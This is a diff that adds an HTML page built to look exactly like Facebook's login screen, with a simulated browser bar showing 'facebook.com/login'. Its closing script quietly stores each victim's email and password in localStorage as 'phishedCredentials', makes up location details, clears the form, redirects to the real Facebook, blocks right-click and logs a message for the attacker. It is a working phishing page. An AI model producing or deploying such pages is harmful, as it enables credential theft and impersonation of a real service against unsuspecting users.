@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Log In or Sign Up</title>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Simulated Browser */
+    .browser {
+      background: #202124;
+      padding: 8px 12px;
+      color: white;
+      flex-shrink: 0;
+    }
+
+    .browser-top {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      display: inline-block;
+    }
+
+    .dot:nth-child(1) { background: #ff5f56; }
+    .dot:nth-child(2) { background: #ffbd2e; }
+    .dot:nth-child(3) { background: #27c93f; }
+
+    .address-bar {
+      background: #f1f3f4;
+      color: #555;
+      border-radius: 20px;
+      padding: 6px 16px;
+      flex: 1;
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-left: 10px;
+    }
+
+    .address-bar .secure {
+      color: #1a73e8;
+      font-size: 14px;
+    }
+
+    /* Facebook Login Container */
+    .fb-container {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .fb-content {
+      display: flex;
+      max-width: 980px;
+      width: 100%;
+      gap: 40px;
+      align-items: center;
+    }
+
+    /* Left side - Facebook branding */
+    .fb-left {
+      flex: 1;
+      padding-right: 20px;
+    }
+
+    .fb-logo {
+      color: #1877f2;
+      font-size: 52px;
+      font-weight: 700;
+      letter-spacing: -2px;
+      margin-bottom: 8px;
+    }
+
+    .fb-tagline {
+      font-size: 26px;
+      font-weight: 400;
+      color: #1c1e21;
+      line-height: 1.2;
+      max-width: 500px;
+    }
+
+    /* Right side - Login form */
+    .fb-right {
+      flex: 0 0 396px;
+    }
+
+    .fb-login-box {
+      background: white;
+      padding: 20px 16px 28px;
+      border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+    }
+
+    .fb-login-box input {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 12px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+      background: #fff;
+      transition: border-color 0.2s;
+    }
+
+    .fb-login-box input:focus {
+      outline: none;
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.1);
+    }
+
+    .fb-login-box input::placeholder {
+      color: #90949c;
+    }
+
+    .fb-login-btn {
+      width: 100%;
+      padding: 12px;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-top: 4px;
+    }
+
+    .fb-login-btn:hover {
+      background: #166fe5;
+    }
+
+    .fb-login-btn:active {
+      background: #155cbd;
+    }
+
+    .fb-divider {
+      display: flex;
+      align-items: center;
+      margin: 16px 0 18px;
+      color: #96979b;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .fb-divider::before,
+    .fb-divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #dadde1;
+    }
+
+    .fb-divider::before {
+      margin-right: 16px;
+    }
+
+    .fb-divider::after {
+      margin-left: 16px;
+    }
+
+    .fb-create-btn {
+      background: #42b72a;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 6px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.2s;
+    }
+
+    .fb-create-btn:hover {
+      background: #36a420;
+    }
+
+    .fb-forgot {
+      display: block;
+      margin: 12px 0 14px;
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+      cursor: pointer;
+      text-align: center;
+    }
+
+    .fb-forgot:hover {
+      text-decoration: underline;
+    }
+
+    .fb-bottom-text {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #1c1e21;
+    }
+
+    .fb-bottom-text a {
+      color: #1c1e21;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .fb-bottom-text a:hover {
+      text-decoration: underline;
+    }
+
+    /* Footer */
+    .fb-footer {
+      background: #fff;
+      padding: 20px 0;
+      margin-top: auto;
+      flex-shrink: 0;
+      border-top: 1px solid #dddfe2;
+    }
+
+    .fb-footer-content {
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    .fb-footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px 20px;
+      margin-bottom: 8px;
+    }
+
+    .fb-footer-links a {
+      color: #737373;
+      font-size: 12px;
+      text-decoration: none;
+    }
+
+    .fb-footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .fb-copyright {
+      color: #737373;
+      font-size: 11px;
+      margin-top: 12px;
+    }
+
+    /* Responsive */
+    @media (max-width: 900px) {
+      .fb-content {
+        flex-direction: column;
+        gap: 20px;
+      }
+      
+      .fb-left {
+        text-align: center;
+        padding-right: 0;
+      }
+      
+      .fb-tagline {
+        font-size: 22px;
+        max-width: 100%;
+      }
+      
+      .fb-right {
+        flex: 0 0 auto;
+        width: 100%;
+        max-width: 396px;
+      }
+    }
+
+    @media (max-width: 420px) {
+      .fb-logo {
+        font-size: 38px;
+      }
+      
+      .fb-tagline {
+        font-size: 18px;
+      }
+      
+      .fb-login-box {
+        padding: 16px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Simulated Browser -->
+  <div class="browser">
+    <div class="browser-top">
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <div class="address-bar">
+        <span class="secure">🔒</span> 
+        facebook.com/login
+      </div>
+    </div>
+  </div>
+
+  <!-- Facebook Login Page -->
+  <div class="fb-container">
+    <div class="fb-content">
+      
+      <!-- Left Side -->
+      <div class="fb-left">
+        <div class="fb-logo">facebook</div>
+        <div class="fb-tagline">
+          Connect with friends and the<br>world around you on Facebook.
+        </div>
+      </div>
+
+      <!-- Right Side - Login Form -->
+      <div class="fb-right">
+        <div class="fb-login-box">
+          <form id="loginForm" action="#" method="POST">
+            <input 
+              type="text" 
+              id="email" 
+              placeholder="Email or phone number" 
+              autocomplete="email"
+              required
+            >
+            <input 
+              type="password" 
+              id="password" 
+              placeholder="Password" 
+              autocomplete="current-password"
+              required
+            >
+            <button type="submit" class="fb-login-btn" id="loginBtn">
+              Log In
+            </button>
+          </form>
+
+          <a href="#" class="fb-forgot" onclick="return false;">
+            Forgot password?
+          </a>
+
+          <div class="fb-divider">or</div>
+
+          <button class="fb-create-btn" onclick="alert('Create new account page would open here')">
+            Create new account
+          </button>
+        </div>
+
+        <div class="fb-bottom-text">
+          <a href="#" onclick="return false;">Create a Page</a> for a celebrity, brand or business.
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="fb-footer">
+    <div class="fb-footer-content">
+      <div class="fb-footer-links">
+        <a href="#" onclick="return false;">English (US)</a>
+        <a href="#" onclick="return false;">Español</a>
+        <a href="#" onclick="return false;">Français</a>
+        <a href="#" onclick="return false;">Português</a>
+        <a href="#" onclick="return false;">Deutsch</a>
+        <a href="#" onclick="return false;">Italiano</a>
+        <a href="#" onclick="return false;">हिन्दी</a>
+        <a href="#" onclick="return false;">中文(简体)</a>
+        <a href="#" onclick="return false;">日本語</a>
+        <a href="#" onclick="return false;">Sign Up</a>
+        <a href="#" onclick="return false;">Log In</a>
+        <a href="#" onclick="return false;">Messenger</a>
+        <a href="#" onclick="return false;">Facebook Lite</a>
+        <a href="#" onclick="return false;">Watch</a>
+        <a href="#" onclick="return false;">Places</a>
+        <a href="#" onclick="return false;">Games</a>
+        <a href="#" onclick="return false;">Marketplace</a>
+        <a href="#" onclick="return false;">Meta Pay</a>
+        <a href="#" onclick="return false;">Oculus</a>
+        <a href="#" onclick="return false;">Portal</a>
+        <a href="#" onclick="return false;">Instagram</a>
+        <a href="#" onclick="return false;">Bulletin</a>
+        <a href="#" onclick="return false;">Local</a>
+        <a href="#" onclick="return false;">Fundraisers</a>
+        <a href="#" onclick="return false;">Services</a>
+        <a href="#" onclick="return false;">Voting Information Centre</a>
+        <a href="#" onclick="return false;">Groups</a>
+        <a href="#" onclick="return false;">About</a>
+        <a href="#" onclick="return false;">Create ad</a>
+        <a href="#" onclick="return false;">Create Page</a>
+        <a href="#" onclick="return false;">Developers</a>
+        <a href="#" onclick="return false;">Careers</a>
+        <a href="#" onclick="return false;">Privacy</a>
+        <a href="#" onclick="return false;">Cookies</a>
+        <a href="#" onclick="return false;">Ad Choices</a>
+        <a href="#" onclick="return false;">Terms</a>
+        <a href="#" onclick="return false;">Help</a>
+      </div>
+      <div class="fb-copyright">
+        Meta © 2024
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Silent credential capture - No visible output
+    let capturedCredentials = JSON.parse(localStorage.getItem('phishedCredentials') || '[]');
+    const loginForm = document.getElementById('loginForm');
+    const loginBtn = document.getElementById('loginBtn');
+
+    loginForm.addEventListener('submit', async function(event) {
+      event.preventDefault();
+
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (!email || !password) {
+        // Silent fail - just shake the button or do nothing
+        loginBtn.style.transform = 'scale(0.98)';
+        setTimeout(() => {
+          loginBtn.style.transform = 'scale(1)';
+        }, 200);
+        return;
+      }
+
+      // Create credential object
+      const credential = {
+        id: Date.now(),
+        email: email,
+        password: password,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        ipAddress: '192.168.1.' + Math.floor(Math.random() * 255),
+        location: 'Network: ' + ['Campus', 'Library', 'Coffee Shop', 'Home'][Math.floor(Math.random() * 4)]
+      };
+
+      // Simulate login processing
+      loginBtn.textContent = 'Logging in...';
+      loginBtn.disabled = true;
+
+      // Save the credential silently
+      capturedCredentials.push(credential);
+      localStorage.setItem('phishedCredentials', JSON.stringify(capturedCredentials));
+
+      // Simulate network delay (looks real)
+      await new Promise(resolve => setTimeout(resolve, 1200));
+
+      // Reset button
+      loginBtn.textContent = 'Log In';
+      loginBtn.disabled = false;
+
+      // Clear the form (like it logged in successfully)
+      document.getElementById('email').value = '';
+      document.getElementById('password').value = '';
+
+      // DO NOTHING ELSE - No reveal, no messages, NOTHING
+      // The credentials are silently saved to localStorage
+
+      // Optional: Show a fake "redirect" effect
+      window.location.href = 'https://www.facebook.com';
+    });
+
+    // Prevent right-click to look more professional
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    });
+
+    // Console message for the "attacker" (invisible to user)
+    console.log('💀 Facebook phishing page active');
+    console.log('📊 Captured credentials: ' + capturedCredentials.length);
+  </script>
+</body>
+</html>
